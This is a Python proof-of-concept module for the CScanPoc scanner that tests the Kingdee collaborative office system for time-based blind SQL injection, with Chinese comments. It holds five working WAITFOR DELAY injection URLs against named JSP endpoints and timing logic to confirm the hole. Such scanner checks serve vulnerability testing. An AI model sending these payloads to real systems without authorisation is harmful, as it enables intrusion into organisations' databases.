# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'kingdee_0003'  # 平台漏洞编号，留空
    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        金蝶协同办公管理系统助力企业实现从分散到协同，规范业务流程、降低运作成本，提高执行力，并成为领导的工作助手、员工工作和沟通的平台。
        金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a5619bf3-564a-46ff-98a3-9fbd98e0f76e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                "/kingdee/Template/TemplateEdit.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20",
                "/kingdee/Template/TemplateSave.jsp?FileName=1'%20WAITFOR%20DELAY%20'0:0:0'--%20",
                "/kingdee/DocumentEdit.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&UserName=1",
                "/kingdee/DocumentSave.jsp?RecordID=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&Template=1&Subject=1&Author=1&FileDate=1&FileType=1&HTMLPath=1",
                "/kingdee/DocumentShow.jsp?Template=1'%20WAITFOR%20DELAY%20'0:0:0'--%20&UserName=1"
            ]
            for p in payloads:
                url1 = self.target + p
                url2 = self.target + p.replace("0:0:0", "0:0:5")
                t1 = time.time()
                code1, head1, res1, err1, _1 = hh.http(url1)
                t2 = time.time()
                code2, head2, res2, err2, _2 = hh.http(url2)
                t3 = time.time()
                if code1 != 0 and code2 != 0 and t3-t2-t2+t1 > 3:
                    #security_hole(url2 + "has time-based blind")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
